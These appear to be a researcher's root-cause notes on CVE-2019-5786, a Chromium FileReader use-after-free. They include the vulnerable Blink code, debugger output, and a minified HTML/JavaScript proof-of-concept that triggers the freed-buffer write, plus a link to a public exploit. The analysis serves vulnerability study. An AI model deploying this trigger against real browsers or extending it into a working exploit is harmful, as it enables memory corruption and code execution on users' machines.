
### Not all ArrayBuffers are equal

- There are various implementations of ArrayBuffers within Chromium and its embedder application (e.g. Blink, V8, [WTF](https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/platform/wtf/README.md#))

- Blink is built on top of WTF which is from WebKit

- Nuances between different ArrayBuffers are well explained by Exodus (just Google)

- Nuances between chromium embedders are also well explained by Man Yue Mo (just Google)

### Exodus RCA

```
DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() {
    DCHECK_EQ(read_type_, kReadAsArrayBuffer);
    if (array_buffer_result_) return array_buffer_result_;
    if (!raw_data_ || error_code_ != FileErrorCode::kOK) return nullptr;
    DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());
    if (finished_loading_) {
        array_buffer_result_ = result;
        AdjustReportedMemoryUsageToV8(
        -1 * static_cast(raw_data_-&gt;ByteLength()));
        raw_data_.reset();
    }
    return result;
}
```

- Function is called everytime the result property is accessed in a callback AFTER FileReader.readAsArrayBuffer

- In theory, the function should be called in the following locations for the example chunk of code:

    ```
    let reader = new FileReader();

    reader.onloadend = function(evt) {
        console.log(`contents as an ArrayBuffer: ${evt.target.result}`);
        // in theory, FileReaderLoader::ArrayBufferResult() should be called here
    }

    reader.onprogress = function(evt) {
        console.log(`read ${evt.target.result.byteLength} bytes so far`);
        // in theory, FileReaderLoader::ArrayBufferResult() should be called here
    }

    let contents = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    f = new File([contents], "a.txt");
    reader.readAsArrayBuffer(f);
    ```

    ```
    0:014> x chrome_child!*FileReaderLoader::ArrayBufferResult*
    62fe5480 chrome_child!blink::FileReaderLoader::ArrayBufferResult (void)
    0:012> ? 62fe5480 - chrome_child
    Evaluate expression: 52515968 = 03215480
    0:014> bp 62fe5480 
    0:014> g
    Breakpoint 0 hit
    eax=04188000 ebx=24956620 ecx=04188000 edx=00000007 esi=252f19a8 edi=0044eba4
    eip=62fe5480 esp=0044eb80 ebp=0044eb94 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    chrome_child!blink::FileReaderLoader::ArrayBufferResult:
    62fe5480 55              push    ebp
    0:000> g
    Breakpoint 0 hit
    eax=04188000 ebx=24956620 ecx=04188000 edx=00000007 esi=252f19a8 edi=0044eba4
    eip=62fe5480 esp=0044eb80 ebp=0044eb94 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    chrome_child!blink::FileReaderLoader::ArrayBufferResult:
    62fe5480 55              push    ebp
    0:000> g
    ```

    - As you can see, there are exactly 2 accesses and hence 2 instances where we hit the breakpoint

- Issue is found here `DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());`: if we have not completed the loading of the arraybuffer, we will pass on a reference to the existing ArrayBuffer to the DOMArrayBuffer::Create function (which could be itself).

- If we have multiple references of the same ArrayBuffer, we could free one reference and use the same reference, resulting in a UaF

### Minified PoC

```
<script>
{
  const reader = new FileReader;

  reader.onprogress = function() {
    const buf1 = reader.result;
    const buf2 = reader.result;
    if (buf1 !== buf2) { // cannot be the same instance because same instance == same backingstore reference (will not be able to UaF). If same instance, v8/blink/wtf will catch the error
      try {
        window.postMessage([buf1], "J", [buf1]); // triggers the free on buf1 which has the same reference as buf2
      } catch {

       }
      let view = new Uint32Array(buf2); // use buf2 which has already been freed
      view[0] = 1048576; 
    }
  };
  reader.onload = function() {
    reader.readAsArrayBuffer(new Blob([1, 2, 3, 4])); // repeatedly read new Blobs which will repeatedly call reader.onprogress n number of times for n number of reader.readAsArrayBuffer
  };

  reader.readAsArrayBuffer(new Blob()); // triggers the exploit
}
</script>
```


https://issues.chromium.org/issues/40094159

https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/

https://github.com/exodusintel/CVE-2019-5786/blob/master/exploit.js

https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/